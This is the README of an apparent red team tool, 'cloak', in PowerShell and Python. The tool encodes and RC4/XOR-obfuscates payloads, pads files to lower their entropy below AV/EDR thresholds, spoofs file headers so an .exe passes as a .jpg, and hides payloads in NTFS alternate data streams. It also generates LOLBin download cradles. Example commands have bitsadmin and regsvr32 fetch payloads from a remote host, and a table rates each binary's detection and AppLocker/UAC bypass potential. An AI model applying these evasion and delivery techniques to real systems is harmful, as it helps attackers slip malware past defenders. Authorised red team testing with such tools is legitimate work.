# cloak.ps1 / cloak.py

A PowerShell and Python red team file utility for encoding, entropy manipulation, header spoofing, alternate data streams, and LOLBin command generation.

---

## Versions

| File | Language | Requirements |
|------|----------|--------------|
| `cloak.ps1` | PowerShell 5.1+ | Windows (built-in) |
| `cloak.py` | Python 3.9+ | Cross-platform, stdlib only |

---

## Modes

| Mode | Description |
|------|-------------|
| `Info` | Inspect a file — size, entropy score, header fingerprint, magic-byte match |
| `Util` | Encode, lower entropy, ADS read/write, rename extension, spoof header |
| `Generate` | LOLBin command generator with OS compatibility notes |

---

## Encoding Techniques

When `-Encode` (PS1) or `--encode` (Python) is passed in `Info` or `Util` mode, an interactive menu appears.

| # | Technique | Output type | Reversible |
|---|-----------|-------------|------------|
| 1 | Base64 | Text | Yes — decode with Base64 |
| 2 | Hex | Text | Yes — parse hex pairs back to bytes |
| 3 | XOR | Binary | Yes — XOR again with the same key |
| 4 | Reverse bytes | Binary | Yes — reverse again |
| 5 | XOR → Base64 | Text | Yes — Base64 decode, then XOR |
| 6 | XOR → Hex | Text | Yes — parse hex, then XOR |
| 7 | RC4 | Binary | Yes — RC4 again with the same key |

### XOR / RC4 Key Format

XOR accepts a single byte key:
```
XOR key: 0x41    # hex
XOR key: 65      # decimal
```

RC4 accepts a string or hex key:
```
RC4 key: mysecretkey
RC4 key: 0xDEADBEEF
```

### When to use each

**Base64** — good default for making binary data text-safe. Output is ~33% larger. Paste-friendly.

**Hex** — human-readable byte representation. Output is 2× input size. Easy to inspect manually.

**XOR** — lightweight obfuscation. Same size as input. Not encryption — combine with Base64 or Hex for transport.

**Reverse** — trivial byte-flip. Defeats naive pattern matching on file headers or known byte sequences.

**XOR → Base64** — XOR for obfuscation, Base64 for text-safe transport. Good balance.

**XOR → Hex** — XOR then hex-encode. Fully printable, easy to paste into scripts.

**RC4** — stream cipher. Same size as input. Stronger than XOR, still lightweight. Appears frequently in real malware because it's small and fast.

---

## Entropy Manipulation

High entropy files (> 7.2) are flagged by most AV/EDR as packed or encrypted. The `--lower-entropy` flag pads the file with structured low-entropy junk to bring the score down into a benign range before encoding.

```
< 6.5   looks benign
6.5–7.2  mildly suspicious
> 7.2   almost certainly flagged
```

The `info` mode always shows the entropy score with a colour-coded label.

---

## Alternate Data Streams (ADS)

Windows/NTFS only. Stores data in a named stream attached to a file — invisible to Explorer and `dir`, no change to the visible file size.

```
file.txt          ← normal file, dir shows this
file.txt:hidden   ← ADS stream, invisible to casual inspection
```

**Streams survive:** renaming on the same NTFS volume, moving within the same drive, `robocopy`.

**Streams are stripped by:** copying to another drive via Explorer, uploading/emailing, copying to FAT32/exFAT, zipping.

Use `dir /r` or `Get-Item -Stream *` to see streams on a file.

---

## LOLBin Generator

Generates ready-to-run commands for 18 Windows built-in binaries (Living Off the Land Binaries). Each entry includes OS compatibility and detection notes so you know what will work on the target before you try it.

**Key caveats by LOLBin:**

| LOLBin | OS compatibility | Detection |
|--------|-----------------|-----------|
| `wmic` | ⚠ Removed Win 11 22H2+ / Server 2025 | Low on older builds |
| `ieexec` | ⚠ Removed Win 11 (requires IE) | Low when present |
| `certutil` | All Windows | Often blocked by ASR rules |
| `mshta` | All Windows | Often blocked by ASR rules |
| `bitsadmin` | All Windows (deprecated but present) | Low — different code path to certutil |
| `powershell` | All Windows | AMSI + ScriptBlock logging on Win 10+ |
| `regsvr32` | All Windows | Classic AppLocker bypass — ASR may block |
| `forfiles` | All Windows | Very low |
| `pcalua` | All Windows | Very low — rarely in EDR rule sets |
| `odbcconf` | All Windows | Very low |
| `rundll32` | All Windows | Monitored — use with obfuscation |
| `installutil` | All Windows with .NET | Medium |
| `regasm` | All Windows with .NET | Low |
| `regsvcs` | All Windows with .NET | Low |
| `cscript` / `wscript` | All Windows | WSH may be disabled via GPO |
| `cmstp` | All Windows | UAC bypass patched in some builds |
| `msiexec` | All Windows | Medium |

---

## Parameters

### PowerShell (`cloak.ps1`)

| Parameter | Type | Description |
|-----------|------|-------------|
| `-Mode` | `Info \| Util \| Generate` | Operation to run *(required)* |
| `-Carrier` | string | Input file |
| `-Output` | string | Output file path |
| `-Encode` | switch | Show interactive encoding menu |
| `-LowerEntropy` | double | Target Shannon entropy e.g. `6.0` — pads before encoding |
| `-NewExtension` | string | Replace all extensions (e.g. `.pdf`) |
| `-AddExtension` | string | Append to filename (e.g. `.bak`) |
| `-SpoofHeader` | switch | Overwrite header with magic bytes for target extension |
| `-ShowHashes` | switch | Display MD5, SHA1, SHA256 |
| `-Quiet` | switch | Suppress the banner |
| `-AdsWrite` | string | Write a file into an ADS stream on `-Carrier` |
| `-AdsRead` | switch | Read ADS stream from `-Carrier` to `-Output` |
| `-AdsList` | switch | List all ADS streams on `-Carrier` |
| `-AdsDelete` | switch | Delete a named ADS stream |
| `-AdsStream` | string | Stream name (e.g. `hidden` → `file.txt:hidden`) |
| `-LolBin` | string | LOLBin name — interactive menu if omitted |
| `-LolBinFile` | string | Local payload file path |
| `-LolBinUrl` | string | Remote URL for download cradles |
| `-LolBinArg` | string | Extra argument (e.g. DLL export name for rundll32) |
| `-List` | switch | List all LOLBins with OS notes and exit |

### Python (`cloak.py`)

| Flag | Short | Description |
|------|-------|-------------|
| `mode` | — | `info \| util \| generate` *(required)* |
| `--carrier` | `-c` | Input file |
| `--output` | `-o` | Output file path |
| `--encode` | `-e` | Show interactive encoding menu |
| `--lower-entropy` | — | Target entropy e.g. `6.0` |
| `--new-extension` | `-n` | Replace all extensions (e.g. `.pdf`) |
| `--add-extension` | `-a` | Append to filename (e.g. `.bak`) |
| `--spoof-header` | `-x` | Overwrite header with magic bytes |
| `--show-hashes` | `-H` | Display MD5, SHA1, SHA256 |
| `--quiet` | `-q` | Suppress the banner |
| `--ads-write` | — | Write payload into ADS on `--carrier` |
| `--ads-read` | — | Read ADS stream to `--output` |
| `--ads-list` | — | List all ADS streams |
| `--ads-delete` | — | Delete a named ADS stream |
| `--ads-stream` | — | Stream name |
| `--lolbin` | — | LOLBin name — interactive menu if omitted |
| `--lolbin-file` | — | Local payload file path |
| `--lolbin-url` | — | Remote URL |
| `--lolbin-arg` | — | Extra argument |
| `--list` | — | List all LOLBins and exit |

---

## Examples

### Inspect a file

```powershell
.\cloak.ps1 -Mode Info -Carrier payload.exe -ShowHashes
```
```bash
python cloak.py info -c payload.exe --show-hashes
```

Output:
```
[*] File           : payload.exe
[*] Size           : 38.76 KB (39690 bytes)
[*] Entropy        : 7.431 / 8.0  (high — likely packed/encrypted)
[*] First 16 bytes : 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00
[+] Header matches known format(s): .exe, .dll
```

### Lower entropy then encode

```powershell
.\cloak.ps1 -Mode Util -Carrier payload.exe -LowerEntropy 6.0 -Encode
```
```bash
python cloak.py util -c payload.exe --lower-entropy 6.0 --encode
```

### Encode + rename + spoof header

```powershell
.\cloak.ps1 -Mode Util -Carrier payload.exe -Encode -NewExtension ".jpg" -SpoofHeader -ShowHashes
```
```bash
python cloak.py util -c payload.exe --encode --new-extension .jpg --spoof-header --show-hashes
```

### Write payload into ADS

```powershell
.\cloak.ps1 -Mode Util -Carrier readme.txt -AdsWrite payload.enc -AdsStream hidden
```
```bash
python cloak.py util -c readme.txt --ads-write payload.enc --ads-stream hidden
```

### Read ADS stream back out

```powershell
.\cloak.ps1 -Mode Util -Carrier readme.txt -AdsRead -AdsStream hidden -Output recovered.bin
```
```bash
python cloak.py util -c readme.txt --ads-read --ads-stream hidden -o recovered.bin
```

### List all ADS streams on a file

```powershell
.\cloak.ps1 -Mode Util -Carrier readme.txt -AdsList
```
```bash
python cloak.py util -c readme.txt --ads-list
```

### List all LOLBins with OS notes

```powershell
.\cloak.ps1 -Mode Generate -List
```
```bash
python cloak.py generate --list
```

### Generate LOLBin commands interactively

```powershell
.\cloak.ps1 -Mode Generate -LolBinFile payload.dll
```
```bash
python cloak.py generate --lolbin-file payload.dll
```

Filters the menu to LOLBins compatible with `.dll` — select one to generate all variants.

### Generate specific LOLBin

```powershell
.\cloak.ps1 -Mode Generate -LolBin bitsadmin -LolBinFile test.txt -LolBinUrl http://10.10.10.1/test.txt
```
```bash
python cloak.py generate --lolbin bitsadmin --lolbin-file test.txt --lolbin-url http://10.10.10.1/test.txt
```

### Save generated commands to file

```bash
python cloak.py generate --lolbin regsvr32 --lolbin-file payload.sct --lolbin-url http://10.10.10.1/p.sct -o commands.txt
```

---

## Supported Magic Bytes

| Extension | Signature |
|-----------|-----------|
| `.pdf` | `25 50 44 46` |
| `.png` | `89 50 4E 47 0D 0A 1A 0A` |
| `.jpg` / `.jpeg` | `FF D8 FF` |
| `.gif` | `47 49 46 38` |
| `.zip` / `.docx` / `.xlsx` / `.pptx` | `50 4B 03 04` |
| `.7z` | `37 7A BC AF 27 1C` |
| `.gz` | `1F 8B` |
| `.rar` | `52 61 72 21 1A 07` |
| `.exe` / `.dll` | `4D 5A` |
| `.elf` | `7F 45 4C 46` |
| `.mp3` | `49 44 33` |
| `.mp4` | `00 00 00 18 66 74 79 70` |
| `.wav` | `52 49 46 46` |
| `.bmp` | `42 4D` |
| `.sqlite` | `53 51 4C 69 74 65 20 66 6F 72 6D 61 74 20 33` |
| `.class` | `CA FE BA BE` |
| `.iso` | `43 44 30 30 31` |

---

## Notes

- No intermediate temp files are left behind after any operation
- Original files are never modified — output always goes to a new file
- Paths with spaces are fully supported
- ADS features require Windows/NTFS — gracefully errors on Linux/Mac
- `cloak.ps1` requires PowerShell 5.1 or later
- `cloak.py` requires Python 3.9 or later, no external packages needed